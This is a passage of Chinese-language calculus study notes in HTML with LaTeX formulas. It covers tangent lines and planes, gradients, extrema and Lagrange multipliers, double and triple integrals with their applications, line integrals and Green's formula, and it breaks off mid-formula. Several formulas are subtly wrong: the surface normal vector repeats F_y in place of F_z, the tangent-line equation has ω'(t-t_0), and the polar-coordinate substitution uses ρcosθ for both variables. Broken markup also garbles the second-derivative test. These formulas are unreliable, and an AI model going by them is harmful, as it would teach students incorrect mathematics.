t_0}f(t)=r_0$ 或 $f(t)\rightarrow r_0,t\rightarrow t_0$</p><p>定义3 设向量值函数$r=f(t)$在点$t_0$的某一邻域内有定义，如果$\lim_{\Delta t\rightarrow 0}\frac{\Delta r}{\Delta t}=\lim_{\Delta t\rightarrow 0}\frac{f(t_0+\Delta t)-f(t_0)}{\Delta t}$存在，那么就称这个极限向量为向量值函数$r=f(t)$在$t_0$处的导数或导向量，记作$f’(t_0)$或$\left .\frac{\text{d} r}{\text{d} t}\right |_ {t=t_0}$</p><p>注意切向量有正负两个</p><h4 id="空间曲线的切线与法平面"><a href="#空间曲线的切线与法平面" class="headerlink" title="空间曲线的切线与法平面"></a>空间曲线的切线与法平面</h4><p>空间曲线参数方程</p><script type="math/tex; mode=display">\left\{\begin{matrix}x=\varphi(t)\\ y=\psi (t)\\z=\omega (t)\end{matrix}\right.</script><p>在点$M(x_0,y_0,z_0)$处的切线方程</p><script type="math/tex; mode=display">\frac{x-x_0}{\varphi'(t_0)}=\frac{y-y_0}{\psi'(t_0)}=\frac{z-z_0}{\omega'(t-t_0)}</script><p>法平面方程</p><script type="math/tex; mode=display">\varphi'(t_0)(x-x_0)+\psi' (t)(y-y_0)+\omega' (t)(z-z_0)=0</script><h4 id="曲线的切平面与法线"><a href="#曲线的切平面与法线" class="headerlink" title="曲线的切平面与法线"></a>曲线的切平面与法线</h4><p>曲面上通过点$M$的一切曲线在点$M$的切线都在同一平面上，这个平面称为曲面$\Sigma $在点$M$的<strong>切平面</strong>，这个切平面的方程是</p><script type="math/tex; mode=display">F_x(x_0,y_0,z_0)(x-x_0)+F_y(x_0,y_0,z_0)(y-y_0)+F_z(x_0,y_0,z_0)(z-z_0)=0</script><p>通过点$M(x_0,y_0,z_0)$且垂直于切平面的直线称为曲面在该点的<strong>法线</strong>，法线方程是</p><script type="math/tex; mode=display">\frac{x-x_0}{F_x(x_0,y_0,z_0)}=\frac{y-y_0}{F_y(x_0,y_0,z_0)}=\frac{z-z_0}{F_z(x_0,y_0,z_0)}</script><p>垂直于曲面上切平面的向量称为<strong>曲面的法向量</strong>，向量</p><script type="math/tex; mode=display">n=(F_x(x_0,y_0,z_0),F_y(x_0,y_0,z_0),F_y(x_0,y_0,z_0))</script><h3 id="方向导数与梯度"><a href="#方向导数与梯度" class="headerlink" title="方向导数与梯度"></a>方向导数与梯度</h3><h4 id="方向导数"><a href="#方向导数" class="headerlink" title="方向导数"></a>方向导数</h4><p>定理 如果函数$f(x,y)$在点$P(x_0,y_0)$可微分，那么函数在该点沿任一方向$l$的方向导数存在，且有</p><script type="math/tex; mode=display">\left .\frac{\partial f}{\partial l}\right |_ {(x_0,y_0)}=f_x(x_0,y_0)\cos \alpha +f_y(x_0,y_0)\cos \beta</script><p>其中，$\cos \alpha$和$\cos \beta$是方向$l$的方向余弦。</p><h4 id="梯度"><a href="#梯度" class="headerlink" title="梯度"></a>梯度</h4><script type="math/tex; mode=display">\mathbf{grad}f(x_0,y_0)=\nabla f(x_0,y_0)=f_x(x_0,y_0)i+f_y(x_0,y_0)j</script><p>其中$\nabla =\frac{\partial}{\partial x}i+\frac{\partial}{\partial y}j$称为（二维的）<strong>向量微分算子</strong>或<strong>Nabla算子</strong>。</p><script type="math/tex; mode=display">\begin{align*} \left .\frac{\partial f}{\partial l}\right |_ {(x_0,y_0)}&= f_x(x_0,y_0)\cos \alpha +f_y(x_0,y_0)\cos \beta\\  &= \mathbf{grad}f(x_0,y_0)\cdot e_l=|\mathbf{grad}f(x_0,y_0)|\cos \theta\\& \theta=(\widehat{\mathbf{grad}f(x_0,y_0),e_l})\end{align*}</script><p>类似地，可以推广到三元函数的情形</p><h4 id="数量场-向量场-引力场"><a href="#数量场-向量场-引力场" class="headerlink" title="数量场 向量场 引力场"></a>数量场 向量场 引力场</h4><p>如果对于空间区域$G$内的任一点$M$，都有一个确定的数量$f(M)$，那么称在这空间区域$G$内确定了<strong>数量场</strong>。一个数量场可用一个数量函数$f(M)$来确定，如果与点$M$相对应的是一个向量$F(M)$，那么称在这空间区域$G$内确实能够了一个<strong>向量场</strong>。一个向量场可用一个向量值函数$F(M)$来确定，而$F(M)=P(M)i+Q(M)j+R(M)k$，其中$P(M),Q(M),R(M)$是点$M$的数量函数。<br>若向量场$F(M)$是某个数量函数$f(M)$的梯度，则称$f(M)$是向量场$F(M)$的一个<strong>势函数</strong>，并称向量场$F(M)$为<strong>势场</strong>。</p><h3 id="多元函数的极值及其求法"><a href="#多元函数的极值及其求法" class="headerlink" title="多元函数的极值及其求法"></a>多元函数的极值及其求法</h3><h4 id="多元函数的极值及最大值和最小值"><a href="#多元函数的极值及最大值和最小值" class="headerlink" title="多元函数的极值及最大值和最小值"></a>多元函数的极值及最大值和最小值</h4><p>定义 设函数$z=f(x,y)$的定义域为$D$，$P_0(x_0,y_0)$为$D$的内点，若存在$P_0$的某个邻域$U(P_0)\subset D$，使得对于该邻域内异于$P_0$的任何点$(x,y)$，都有$f(x,y) &lt; f(x_0,y_0)$，则称函数$f(x,y)$在点$(x_0,y_0)$有<strong>极大值</strong>$f(x_0,y_0)$，点$(x_0,y_0)$称为函数的<strong>极大值点</strong>。<br>类似地，可以定义极小值点，极大值与极小值统称为<strong>极值</strong>，使得函数取得极值的点称为<strong>极值点</strong>。</p><p>定理1（必要条件） 设函数$z=f(x,y)$在点$(x_0,y_0)$具有偏导数，且在点$(x_0,y_0)$处有极值，则有$f_x(x_0,y_0)=0,f_y(x_0,y_0)=0$</p><p>凡是能使$f_x(x_0,y_0)=0,f_y(x_0,y_0)=0$成立的点$x_0,y_0$称为函数$z=f(x,y)$的<strong>驻点</strong></p><p>定理2（充分条件） 设函数$z=f(x,y)$在点$(x_0,y_0)$的某一邻域内连续且有一阶及二阶连续偏导数，又$f_x(x_0,y_0)=0,f_y(x_0,y_0)=0$，令</p><script type="math/tex; mode=display">f_{xx}(x_0,y_0)=A,f_{xy}(x_0,y_0)=B,f_{yy}(x_0,y_0)=C</script><p>则$f(x,y)$在$(x_0,y_0)$处是否取得极值的条件如下：<br>（1）$AC-B^2&gt;0$时具有极值，且当$A<0$时有极大值，当$a>0$时有极小值；<br>（2）$AC-B^2&lt;0$时没有极值；<br>（3）$AC-B^2=0$时可能有极值，也可能没有极值，还需另作讨论。</0$时有极大值，当$a></p><h4 id="条件极值"><a href="#条件极值" class="headerlink" title="条件极值"></a>条件极值</h4><p>对于函数自变量，除了限制在函数的定义域内外，并无其他条件，称为<strong>无条件极值</strong>。<br>对自变量有附加条件的极值称为<strong>条件极值</strong>。<br>有时需要将条件极值转化成无条件极值进行计算。</p><h4 id="拉格朗日乘数法"><a href="#拉格朗日乘数法" class="headerlink" title="拉格朗日乘数法"></a>拉格朗日乘数法</h4><p>一种寻求条件极值的方法<br>要找函数$z=f(x,y)$在附加条件下$\varphi(x,y)=0$下的可能极值点，可以先作<strong>拉格朗日函数</strong></p><script type="math/tex; mode=display">L(x,y)=f(x,y)+\lambda \varphi(x,y)</script><p>其中$\lambda $为参数，称为<strong>拉格朗日乘子</strong>，求其对$x$与$y$的一阶偏导数，并使之为零，$L_x(x,y)=0,L_y(x,y)=0$，联立可得</p><script type="math/tex; mode=display">\left\{\begin{matrix}f_x(x,y)+\lambda \varphi_x(x,y)=0\\ f_y(x,y)+\lambda \varphi_y(x,y)=0\\\varphi(x,y)=0 \end{matrix}\right.</script><p>由此解出$x,y,\lambda$，这样得到的$(x,y)$就是函数$f(x,y)$在附加条件$\varphi(x,y)=0$下的可能极值点<br>$\lambda$表示的是$-\frac{f_y(x_0,y_0)}{\varphi_y(x_0,y_0)}$</p><p>多变量多条件情况下的拉格朗日函数</p><script type="math/tex; mode=display">L(x,y,z,t)=f(x,y,z,t)+\lambda \varphi(x,y,z,t)+\mu \psi(x,y,z,t)</script><h2 id="第十章-重积分"><a href="#第十章-重积分" class="headerlink" title="第十章 重积分"></a>第十章 重积分</h2><h3 id="二重积分的概念与性质"><a href="#二重积分的概念与性质" class="headerlink" title="二重积分的概念与性质"></a>二重积分的概念与性质</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>曲顶柱体：它的底是$xOy$面上的闭区域，则侧面是以$D$的边界曲线为准线，母线平行于$z$轴的柱面，顶是曲面。</p><p>定义： 设$f(x,y)$是有界闭区域$D$上的有界函数，将闭区域$D$任意分成$n$个小闭区域$\Delta \sigma_1, \Delta \sigma_2,…,\Delta \sigma_n$，其中$\Delta \sigma_i$表示第$i$个小闭区域，也表示它的表面积。在每个$\Delta \sigma_i$上任取一点$(\xi_i, \eta_i)$，作乘积$f(\xi_i, \eta_i)\Delta \sigma_i(i=1,2,…,n)$，并作和$\sum_{i=1}^{n}f(\xi_i, \eta_i)\Delta \sigma_i$。如果当各小闭区域的直径中的最大值$\lambda \rightarrow 0$时，这和的极限总存在，且与闭区域$D$的分法及点$(\xi_i, \eta_i)$的取法无关，那么称此极限为函数$f(x,y)$在闭区域$D$上的<strong>二重积分</strong>，记作$\iint_{D}f(x,y)\text{d}\sigma$，即</p><script type="math/tex; mode=display">\iint_{D}f(x,y)\text{d}\sigma=\lim_{\lambda \rightarrow 0}{\sum_{i=1}^{n}f(\xi_i, \eta_i)\Delta \sigma_i}</script><p>其中$f(x,y)$叫做<strong>被积函数</strong>，$f(x,y)\text{d}\sigma$叫做<strong>被积表达式</strong>，$\text{d}\sigma$叫做<strong>面积元素</strong>，$x$与$y$叫做<strong>积分变量</strong>，$D$叫做<strong>积分区域</strong>，<br>$\sum_{i=1}^{n}f(\xi_i, \eta_i)\Delta \sigma_i$叫做<strong>积分和</strong>。<br>$\text{d}\sigma$有时记作$\text{d}x\text{d}y$叫做直角坐标系中的面积元素</p><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><ul><li>性质1<script type="math/tex; mode=display">\iint _{D}{[\alpha f(x,y)+\beta g(x,y)]\text{d}\sigma}=\alpha \iint_{D}f(x,y)\text{d}\sigma+\beta \iint_{D}g(x,y)\text{d}\sigma</script></li><li>性质2 积分区域可加性<script type="math/tex; mode=display">\iint_{D}f(x,y)\text{d}\sigma=\iint_{D_1}f(x,y)\text{d}\sigma+\iint_{D_2}f(x,y)\text{d}\sigma,D=D_1+D_2</script></li><li>性质3<script type="math/tex; mode=display">\sigma=\iint_{D}1\cdot\text{d}\sigma=\iint_{D}\text{d}\sigma</script></li><li>性质4<br>如果在$D$上，$f(x,y)\leqslant g(x,y)$，那么有<script type="math/tex; mode=display">\iint_{D}f(x,y)\text{d}\sigma\leqslant \iint_{D}g(x,y)\text{d}\sigma</script>特殊地，由于<script type="math/tex; mode=display">-|f(x,y)|\leqslant f(x,y)\leqslant |f(x,y)|</script>又有<script type="math/tex; mode=display">\left |\iint_{D}f(x,y)\text{d}\sigma\right |\leqslant \iint_{D}|f(x,y)|\text{d}\sigma</script></li><li>性质5 设$M$和$m$分别是$f(x,y)$在闭区域$D$上的最大值和最小值<script type="math/tex; mode=display">m\sigma\leqslant \iint_{D}f(x,y)\text{d}\sigma\leqslant M\sigma</script><script type="math/tex; mode=display">\iint_{D}m\text{d}\sigma\leqslant \iint_{D}f(x,y)\text{d}\sigma\leqslant \iint_{D}M\text{d}\sigma</script></li><li>性质6（二重积分的中值定理） 设函数$f(x,y)$在闭区域$D$连续，$\sigma$是$D$的面积，则在$D$上至少存在一点$(\xi_i, \eta_i)$，使得<script type="math/tex; mode=display">\iint_{D}f(x,y)\text{d}\sigma=f(\xi_i, \eta_i)\sigma</script></li></ul><h3 id="二重积分的计算法"><a href="#二重积分的计算法" class="headerlink" title="二重积分的计算法"></a>二重积分的计算法</h3><h4 id="利用直角坐标计算二重积分"><a href="#利用直角坐标计算二重积分" class="headerlink" title="利用直角坐标计算二重积分"></a>利用直角坐标计算二重积分</h4><p>转化成二次积分</p><script type="math/tex; mode=display">\iint_{D}f(x,y)\text{d}\sigma=\int_{a}^{b}{\text{d}x\int_{\varphi_1(x)}^{\varphi_2(x)}f(x,y)\text{d}y}</script><script type="math/tex; mode=display">\iint_{D}f(x,y)\text{d}\sigma=\int_{a}^{b}{\text{d}y\int_{\psi_1(y)}^{\psi_2(y)}f(x,y)\text{d}x}</script><p>积分的时候注意是不是$X$型区域或$Y$型区域</p><h4 id="利用极坐标计算二重积分"><a href="#利用极坐标计算二重积分" class="headerlink" title="利用极坐标计算二重积分"></a>利用极坐标计算二重积分</h4><script type="math/tex; mode=display">\iint_{D}f(x,y)\text{d}\sigma=\iint_{D}f(\rho \cos \theta,\rho \cos \theta)\rho\text{d}\rho\text{d}\theta</script><p>$\rho\text{d}\rho\text{d}\theta$就是极坐标中的面积元素</p><script type="math/tex; mode=display">\iint_{D}f(\rho \cos \theta,\rho \cos \theta)\rho\text{d}\rho\text{d}\theta=\int_{\alpha}^{\beta}\text{d}\theta\int_{\varphi_1(\theta)}^{\varphi_2(\theta)}f(\rho \cos \theta,\rho \cos \theta)\rho\text{d}\rho</script><p>面积</p><script type="math/tex; mode=display">\sigma=\iint_{D}\rho\text{d}\rho\text{d}\theta=\int_{\alpha}^{\beta}\text{d}\theta\int_{\varphi_1(\theta)}^{\varphi_2(\theta)}\rho\text{d}\rho=\frac{1}{2}\int_{\alpha}^{\beta}[\varphi_{2}^{2}(\theta)-\varphi_{1}^{2}(\theta)]\text{d}\theta</script><p>例题 反常积分的计算<br>反常积分$\int_{0}^{+\infty }e^{-x^2}\text{d}x$<br>设</p><script type="math/tex; mode=display">\begin{align*}D_1&= \{(x,y)|x^2+y^2\leqslant R^2,x\geqslant 0,y\geqslant 0\} \\ D_2 &= \{(x,y)|x^2+y^2\leqslant 2R^2,x\geqslant 0,y\geqslant 0\}\\ S &=\{(x,y)|0\leqslant x\leqslant R,0\leqslant y\leqslant R\} \end{align*}</script><p>显然$D_1\subset S\subset D_2$，有二重积分不等式</p><script type="math/tex; mode=display">\iint_{D_1}e^{-x^2-y^2}\text{d}x\text{d}y < \iint_{S}e^{-x^2-y^2}\text{d}x\text{d}y<\iint_{D_2}e^{-x^2-y^2}\text{d}x\text{d}y</script><p>又因为</p><script type="math/tex; mode=display">\iint_{S}e^{-x^2-y^2}\text{d}x\text{d}y=\int_{0}^{R}e^{-x^2}\text{d}x\cdot \int_{0}^{R}e^{-y^2}\text{d}y=\left (\int_{0}^{R}e^{-x^2}\text{d}x\right )^2</script><p>而</p><script type="math/tex; mode=display">\iint_{D_1}e^{-x^2-y^2}\text{d}x\text{d}y=\frac{\pi}{4}(1-e^{-R^2}),\iint_{D_2}e^{-x^2-y^2}\text{d}x\text{d}y=\frac{\pi}{4}(1-e^{-2R^2})</script><p>不等式可写成</p><script type="math/tex; mode=display">\frac{\pi}{4}(1-e^{-R^2})<\left (\int_{0}^{R}e^{-x^2}\text{d}x\right )^2<\frac{\pi}{4}(1-e^{-2R^2})</script><p>令$R\rightarrow +\infty$，上式左右两端趋于同一极限$\frac{\pi}{4}$，从而</p><script type="math/tex; mode=display">\int_{0}^{+\infty }e^{-x^2}\text{d}x=\frac{\sqrt{\pi}}{2}</script><h3 id="三重积分"><a href="#三重积分" class="headerlink" title="三重积分"></a>三重积分</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><script type="math/tex; mode=display">\iiint_{\Omega }f(x,y,z)\text{d}v=\lim_{\lambda \rightarrow 0}\sum_{i=0}^{n}f(\xi_i, \eta_i, \zeta_i )\Delta v_i</script><p>其中$\text{d}v$称为体积元素，$\text{d}v=\text{d}x\text{d}y\text{d}z$叫做直角坐标系中的体积元素<br>$\Omega$是该物体所占有的空间闭区域</p><h4 id="三重积分的计算"><a href="#三重积分的计算" class="headerlink" title="三重积分的计算"></a>三重积分的计算</h4><p>直角坐标中计算三重积分<br>转换成三次积分</p><script type="math/tex; mode=display">\iiint_{\Omega}f(x,y,z)\text{d}v=\int_{a}^{b}\text{d}x\int_{y_1(x)}^{y_2(x)}\text{d}y\int_{z_1(x,y)}^{z_2(x,y)}f(x,y,z)\text{d}z</script><p>转换成一个二重积分和一个定积分</p><script type="math/tex; mode=display">\iiint_{\Omega}f(x,y,z)\text{d}v=\int_{c_1}^{c_2}\text{d}z\iint_{D_z}f(x,y,z)\text{d}x\text{d}y</script><p>利用柱面坐标计算三重积分<br>柱面坐标与直角坐标对应关系</p><script type="math/tex; mode=display">\left\{\begin{matrix}x=\rho\cos\theta\\ y=\rho\sin\theta\\ z=z\end{matrix}\right.</script><p>$\text{d}v=\rho\text{d}\rho\text{d}\theta\text{d}z$，叫做柱面坐标系中的体积元素</p><script type="math/tex; mode=display">\iiint_{\Omega}f(x,y,z)\text{d}v=\iiint_{\Omega}F(\rho,\theta,z)\rho\text{d}\rho\text{d}\theta\text{d}z</script><p>其中$F(\rho,\theta,z)=f(\rho\cos\theta,\rho\sin\theta,z)$</p><h3 id="重积分的应用"><a href="#重积分的应用" class="headerlink" title="重积分的应用"></a>重积分的应用</h3><h4 id="曲面的面积"><a href="#曲面的面积" class="headerlink" title="曲面的面积"></a>曲面的面积</h4><script type="math/tex; mode=display">\text{d}A=\frac{\text{d}\sigma}{\cos\gamma }</script><p>因为</p><script type="math/tex; mode=display">\cos\gamma =\frac{1}{\sqrt{1+f^2_x(x,y)+f_y^2(x,y)}}</script><p>所以</p><script type="math/tex; mode=display">\text{d}A=\sqrt{1+f^2_x(x,y)+f_y^2(x,y)}\text{d}\sigma</script><p>这就是曲面$S$的面积元素，积分得</p><script type="math/tex; mode=display">A=\iint_{D}\sqrt{1+f^2_x(x,y)+f_y^2(x,y)}\text{d}\sigma</script><h4 id="质心"><a href="#质心" class="headerlink" title="质心"></a>质心</h4><p>平面薄片质心<br>设在$xOy$平面上有$n$个质点，它们分别位于点$(x_1,y_1),(x_2,y_2),…,(x_n,y_n)$处，质量分别为$m_1,m_2,…,m_n$，由力学知道，该质点系的质心坐标为</p><script type="math/tex; mode=display">\bar{x}=\frac{M_y}{M}=\frac{\sum_{i=1}^{n}m_ix_i}{\sum_{i=1}^{n}m_i},\bar{y}=\frac{M_x}{M}=\frac{\sum_{i=1}^{n}m_iy_i}{\sum_{i=1}^{n}m_i}</script><p>其中$M=\sum_{i=1}^nm_i$为质点系的总质量，$M_y=\sum_{i=1}^nm_ix_i,M_x=\sum_{i=1}^nm_iy_i$分别为该质点系对$y$轴和$x$轴的<strong>静矩</strong>。<br>平面薄片在点$(x,y)$处密度$\mu(x,y)$<br>静矩元素$\text{d}M_y=x\mu(x,y)\text{d}\sigma,\text{d}M_x=y\mu(x,y)\text{d}\sigma$<br>积分得</p><script type="math/tex; mode=display">M_y=\iint_{D}x\mu(x,y)\text{d}\sigma,M_x=\iint_{D}y\mu(x,y)\text{d}\sigma</script><p>薄片质量</p><script type="math/tex; mode=display">M=\iint_{D}\mu(x,y)\text{d}\sigma</script><p>质心坐标</p><script type="math/tex; mode=display">\bar{x}=\frac{M_y}{M}=\frac{\iint_{D}x\mu(x,y)\text{d}\sigma}{\iint_{D}\mu(x,y)\text{d}\sigma},\bar{y}=\frac{M_x}{M}=\frac{\iint_{D}y\mu(x,y)\text{d}\sigma}{\iint_{D}\mu(x,y)\text{d}\sigma}</script><p>如果各点密度相同，那么可以约去，我们吧均匀平面薄片的质心叫做这平面薄片所占的平面图形的<strong>形心</strong>。</p><h4 id="转动惯量"><a href="#转动惯量" class="headerlink" title="转动惯量"></a>转动惯量</h4><p>$n$个点对于$x$轴和$y$轴的转动惯量依次为</p><script type="math/tex; mode=display">I_x=\sum_{i=1}^ny_i^2m_i,I_y=\sum_{i=1}^nx_i^2m_i</script><p>转动惯量元素</p><script type="math/tex; mode=display">\text{d}I_x=y^2\mu(x,y)\text{d}\sigma,\text{d}I_y=x^2\mu(x,y)\text{d}\sigma</script><p>积分得</p><script type="math/tex; mode=display">I_x=\iint_{D}y^2\mu(x,y)\text{d}\sigma,I_y=\iint_{D}x^2\mu(x,y)\text{d}\sigma</script><h4 id="引力"><a href="#引力" class="headerlink" title="引力"></a>引力</h4><script type="math/tex; mode=display">\text{d}F=(\text{d}F_x,\text{d}F_y,\text{d}F_z)=(G\frac{\rho(x,y,z)(x-x_0)}{r^3}\text{d}v,G\frac{\rho(x,y,z)(y-y_0)}{r^3}\text{d}v,G\frac{\rho(x,y,z)(z-z_0)}{r^3}\text{d}v)</script><p>其中$r=\sqrt{(x-x_0)^2+(y-y_0)^2+(z-z_0)^2}$<br>所以，积分得</p><script type="math/tex; mode=display">F=(F_x,F_y,F_z)=(\iiint_{\Omega}G\frac{\rho(x,y,z)(x-x_0)}{r^3}\text{d}v,\iiint_{\Omega}G\frac{\rho(x,y,z)(y-y_0)}{r^3}\text{d}v,\iiint_{\Omega}G\frac{\rho(x,y,z)(z-z_0)}{r^3}\text{d}v)</script><h2 id="第十一章-曲线积分与曲面积分"><a href="#第十一章-曲线积分与曲面积分" class="headerlink" title="第十一章 曲线积分与曲面积分"></a>第十一章 曲线积分与曲面积分</h2><h3 id="对弧长的曲线积分"><a href="#对弧长的曲线积分" class="headerlink" title="对弧长的曲线积分"></a>对弧长的曲线积分</h3><h4 id="对弧长的曲线积分的概念与性质"><a href="#对弧长的曲线积分的概念与性质" class="headerlink" title="对弧长的曲线积分的概念与性质"></a>对弧长的曲线积分的概念与性质</h4><p>定义 设$L$为$xOy$面内的一条光滑曲线弧，函数$f(x,y)$在$L$上有界，在$L$上任意插入一点列$M_1,M_2,…,M_{n-1}$把$L$分成$n$个小段，设第$i$个小段的长度为$\Delta s_i$，又$(\xi_i,\eta_i)$为第$i$个小段上任意取定的一点，作乘积$f(\xi_i,\eta_i)\Delta s_i(i=1,2,…,n)$，并作和$\sum_{i=1}^n f(\xi_i,\eta_i)\Delta s_i$，如果当各个小弧段的长度的最大值$\lambda \rightarrow 0$时，这和的极限总存在，且与曲线弧$L$的分法及点$(\xi_i,\eta_i)$的取法无关，那么称此极限为函数$f(x,y)$在曲线弧$L$上<strong>对弧长的曲线积分</strong>或<strong>第一类曲线积分</strong>，记作$\int_{L}f(x,y)\text{d}s$，即</p><script type="math/tex; mode=display">\int_{L}f(x,y)\text{d}s=\lim_{\lambda\rightarrow 0}\sum_{i=1}^n f(\xi_i,\eta_i)\Delta s_i</script><p>其中$f(x,y)$叫做<strong>被积函数</strong>，$L$叫做<strong>积分弧段</strong>。</p><ul><li>性质1<script type="math/tex; mode=display">\int_{L}[\alpha f(x,y)+\beta g(x,y)]\text{d}s=\alpha\int_{L}f(x,y)\text{d}s+\beta\int_{L}g(x,y)\text{d}s</script></li><li>性质2<script type="math/tex; mode=display">\int_{L}f(x,y)\text{d}s=\int_{L_1}f(x,y)\text{d}s+\int_{L_2}f(x,y)\text{d}s,L=L_1+L_2</script></li><li>性质3 设在$L$上有$f(x,y)\leqslant g(x,y)$，则<script type="math/tex; mode=display">\int_{L}f(x,y)\text{d}s\leqslant \int_{L}g(x,y)\text{d}s</script>特别地，有<script type="math/tex; mode=display">\left |\int_{L}f(x,y)\text{d}s \right |\leqslant \int_{L}|f(x,y)|\text{d}s</script></li></ul><h4 id="对弧长的曲线积分的计算法"><a href="#对弧长的曲线积分的计算法" class="headerlink" title="对弧长的曲线积分的计算法"></a>对弧长的曲线积分的计算法</h4><p>定理 设$f(x,y)$在曲线弧$L$上有定义且连续，$L$的参数方程为</p><script type="math/tex; mode=display">\left\{\begin{matrix}x=\varphi(t)\\ y=\psi(t)\end{matrix}\right.,(\alpha \leqslant t\leqslant \beta)</script><p>若$\varphi(t),\psi(t)$在$[\alpha,\beta]$上具有一阶连续导数，且$\varphi ‘^2(t)+\psi ‘^2(t)\neq 0$，则曲线积分$\int_{L}f(x,y)\text{d}s$存在，且</p><script type="math/tex; mode=display">\int_{L}f(x,y)\text{d}s=\int_{\alpha}^{\beta}f[\varphi(t),\psi(t)]\sqrt{\varphi '^2(t)+\psi '^2(t)}\text{d}t,(\alpha < \beta)</script><h3 id="对坐标的曲线积分"><a href="#对坐标的曲线积分" class="headerlink" title="对坐标的曲线积分"></a>对坐标的曲线积分</h3><h4 id="对坐标的曲线积分的概念和性质"><a href="#对坐标的曲线积分的概念和性质" class="headerlink" title="对坐标的曲线积分的概念和性质"></a>对坐标的曲线积分的概念和性质</h4><p>函数$P(x,y)$在有向曲线弧$L$上对坐标$x$的曲线积分</p><script type="math/tex; mode=display">\int_{L}P(x,y)\text{d}x=\lim_{\lambda \rightarrow 0}\sum_{i=1}^nP(\xi_i,\eta_i)\Delta x_i</script><p>函数$Q(x,y)$在有向曲线弧$L$上对坐标$y$的曲线积分</p><script type="math/tex; mode=display">\int_{L}Q(x,y)\text{d}y=\lim_{\lambda \rightarrow 0}\sum_{i=1}^nQ(\xi_i,\eta_i)\Delta y_i</script><p>其中$P(x,y),Q(x,y)$叫做<strong>被积函数</strong>，$L$叫做<strong>积分弧段</strong>。<br>以上两个积分也称为<strong>第二类曲线积分</strong>。</p><p>经常出现的</p><script type="math/tex; mode=display">\int_{L}P(x,y)\text{d}x+Q(x,y)\text{d}y</script><p>也可写成向量形式</p><script type="math/tex; mode=display">\int_{L}F(x,y)\cdot \text{d}r,F(x,y)=P(x,y)i+Q(x,y)j,\text{d}r=\text{d}xi+\text{d}yj</script><ul><li>性质1<script type="math/tex; mode=display">\int_{L}[\alpha F_1(x,y)+\beta F_2(x,y)]\cdot \text{d}r=\alpha\int_{L}F_1(x,y)\text{d}r+\beta\int_{L}F_2(x,y)\cdot \text{d}r</script></li><li>性质2<script type="math/tex; mode=display">\int_{L}F(x,y)\cdot \text{d}r=\int_{L_1}F(x,y)\cdot \text{d}r+\int_{L_2}F(x,y)\cdot \text{d}r,L=L_1+L_2</script></li><li>性质3 $L^{-}$是$L$的反向曲线弧<script type="math/tex; mode=display">\int_{L^{-}}F(x,y)\cdot \text{d}=-\int_{L}F(x,y)\cdot \text{d}r</script></li></ul><h4 id="对坐标的曲线积分计算法"><a href="#对坐标的曲线积分计算法" class="headerlink" title="对坐标的曲线积分计算法"></a>对坐标的曲线积分计算法</h4><script type="math/tex; mode=display">\int_{L}P(x,y)\text{d}x+Q(x,y)\text{d}y=\int_{\alpha}^{\beta}\{P[\varphi(t),\psi(t)]\varphi '(t)+Q[\varphi(t),\psi(t)]\psi '(t)\}\text{d}t</script><h4 id="两类曲线积分之间的联系"><a href="#两类曲线积分之间的联系" class="headerlink" title="两类曲线积分之间的联系"></a>两类曲线积分之间的联系</h4><script type="math/tex; mode=display">\int_{L}P\text{d}x+Q\text{d}y=\int_{L}(P\cos \alpha + Q\cos \beta)\text{d}s</script><p>其中$\alpha(x,y),\beta(x,y)$是有向曲线弧$L$在点$(x,y)$处的切向量的方向角。<br>也可以写成向量形式</p><script type="math/tex; mode=display">\int_{\Gamma }A\cdot \text{d}r=\int_{\Gamma }A\cdot \tau\text{d}s,A=(P,Q,R),\tau =(\cos \alpha,\cos \beta,\cos \gamma )</script><p>$\tau$为单位切向量，$\text{d}r=\tau\text{d}s=(\text{d}x,\text{d}y,\text{d}z)$称为<strong>有向曲线元</strong>。</p><h3 id="格林公式及其应用"><a href="#格林公式及其应用" class="headerlink" title="格林公式及其应用"></a>格林公式及其应用</h3><h4 id="平面连通区域"><a href="#平面连通区域" class="headerlink" title="平面连通区域"></a>平面连通区域</h4><p>设$D$为平面区域，若$D$内任一闭曲线所围成的部分都属于$D$，则称$D$为平面<strong>单连通区域</strong>，否则称为<strong>复连通区域</strong>。</p><h4 id="格林公式"><a href="#格林公式" class="headerlink" title="格林公式"></a>格林公式</h4><p>定理1 设闭区域$D$由分段光滑的曲线$L$围成，若函数$P(x,y)$及$Q(x,y)$在$D$上具有一阶连续偏导数，则有</p><script type="math/tex; mode=display">\iint_{D}\left (\frac{\partial Q}{\partial x}-\frac{\partial P}{\partial y}\right)\text{d}x\text{d}y=\oint_{L}P\text{d}x+Q\text{d}y</script><p>其中$L$是$D$的取正向的边界曲线，公式叫做<strong>格林公式</strong>。</p><h4 id="平面上曲线积分与路径无关的条件"><a href="#平面上曲线积分与路径无关的条件" class="headerlink" title="平面上曲线积分与路径无关的条件"></a>平面上曲线积分与路径无关的条件</h4><p>设$G$是一个区域，$P(x,y)$以及$Q(x,y)$在区域$G$内具有一阶连续偏导数，如果对于$G$内任意指定的两个点$A,B$以及$G$内从点$A$到点$B$的任意两条曲线$L_1,L_2$，等式</p><script type="math/tex; mode=display">\int_{L_1}P\text{d}x+Q\text{d}y=\int_{L_2}P\text{d}x+Q\text{d}y</script><p>恒成立，就说曲线积分$\int_{L}P\text{d}x+Q\text{d}y$在$G$内与路径无关，否则便说与路径有关。<br>换句话说，将其中一条曲线反向就可以得到，曲线积分在$G$内沿任意闭曲线$C$的曲线积分$\oint_{C}P\text{d}x+Q\text{d}y$等于零。</p><p>定理2 设区域$G$是一个单连通区域，若函数$P(x,y),Q(x,y)$在$G$内具有一阶连续偏导数，则曲线积分$\int_{L}P\text{d}x+Q\text{d}y$在$G$内与路径无关（或沿$G$内任意闭曲线的曲线积分为零）的充分必要条件是</p><script type="math/tex; mode=display">\frac{\partial P}{\partial y}=\frac{\partial Q}{\partial x}</script><p>在$G$内恒成立。</p><p>其中破坏$P,Q,\frac{\partial P}{\partial y},\frac{\partial Q}{\partial x}$连续性的点叫做<strong>奇点</strong>。</p><h4 id="二元函数的全微分求积"><a href="#二元函数的全微分求积" class="headerlink" title="二元函数的全微分求积"></a>二元函数的全微分求积</h4><p>定理3 设区域$G$是一个单连通区域，若函数$P(x,y),Q(x,y)$在$G$内具有一阶连续偏导数，则$P(x,y)\text{d}x+Q(x,y)\text{d}y$在$G$内为某一函数$u(x,y)$的全微分的充分必要条件是</p><script type="math/tex; mode=display">\frac{\partial P}{\partial y}=\frac{\partial Q}{\partial 